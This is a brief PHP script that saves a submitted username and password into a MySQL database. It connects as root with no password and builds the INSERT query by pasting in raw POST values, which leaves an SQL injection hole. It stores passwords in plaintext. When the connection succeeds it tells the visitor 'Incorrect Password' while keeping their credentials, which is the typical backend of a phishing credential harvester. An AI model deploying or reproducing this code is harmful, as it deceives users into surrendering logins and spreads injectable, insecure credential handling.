<?php 

$con = mysqli_connect('localhost','root');

if ($con) {
	echo "Incorrect Password";
} else {
	echo "Not Connected";
}

mysqli_select_db($con, 'action');

$user = $_POST['user'];
$password = $_POST['password'];

$query = " insert into actiondata(user, password)
values ('$user','$password')";

mysqli_query($con, $query);



 ?>